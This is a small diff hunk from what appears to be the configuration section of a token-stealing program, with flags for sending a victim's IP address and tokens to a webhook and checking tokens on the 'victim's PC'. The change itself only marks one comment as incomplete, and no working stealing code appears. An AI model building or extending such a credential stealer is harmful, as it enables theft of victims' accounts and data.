@@ -15,7 +15,7 @@ let
 const 
   sendIP: char = 'N' ## Send IP Address to webhook 
   embed:  char = 'N' ## Send the tokens in a fancy embed
-  check:  char = 'N' ## Check the tokens in victim's PC 
+  check:  char = 'N' ## Check the tokens in victim's PC [INCOMPLETE]
   
 # Do not touch the following
 # --------------------------
